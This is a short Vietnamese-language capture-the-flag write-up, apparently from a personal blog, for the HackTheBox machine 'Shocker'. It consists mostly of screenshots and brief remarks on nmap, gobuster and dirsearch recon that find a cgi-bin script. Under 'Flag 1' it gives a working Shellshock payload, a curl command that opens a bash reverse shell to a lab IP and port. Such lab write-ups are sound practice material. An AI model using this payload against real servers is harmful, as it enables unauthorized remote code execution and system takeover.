...
tags:
  ...
  - Linux
  - HTB-Easy
permalink: /hackthebox/easy/shocker/
---
# Mô tả
...
![Screenshot](/assets/htb/Pasted%20image%2020250107002756.png)
# Attack
## Recon
Như thường lệ, vẫn là `nmap`.

![Screenshot](/assets/htb/Pasted%20image%2020250107003411.png)

Vẫn là port 80 quen thuộc. Truy cập web thôi.

![Screenshot](/assets/htb/Pasted%20image%2020250107005044.png)
...
![Screenshot](/assets/htb/Pasted%20image%2020250107003800.png)

Kết quả từ gobuster cũng vọn vẹn nhiêu đây. À há có `cgi-bin` kìa. Thử dirsearch phát nữa xem có gì hot.

![Screenshot](/assets/htb/Pasted%20image%2020250107005222.png)

Ây da, lòi ra một file `.sh`.

![Screenshot](/assets/htb/Pasted%20image%2020250107005233.png)
...
![Screenshot](/assets/htb/Pasted%20image%2020250107013223.png)

Ngol lụm luôn.
## Flag 1
![Screenshot](/assets/htb/Pasted%20image%2020250107013519.png)
...
![Screenshot](/assets/htb/Pasted%20image%2020250107014136.png)
...
![Screenshot](/assets/htb/Pasted%20image%2020250107015655.png)

Payload: `curl -A '() { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.16.14/2804 0>&1' http://10.129.206.242/cgi-bin/user.sh`.
## Flag 2
![Screenshot](/assets/htb/Pasted%20image%2020250107020250.png)
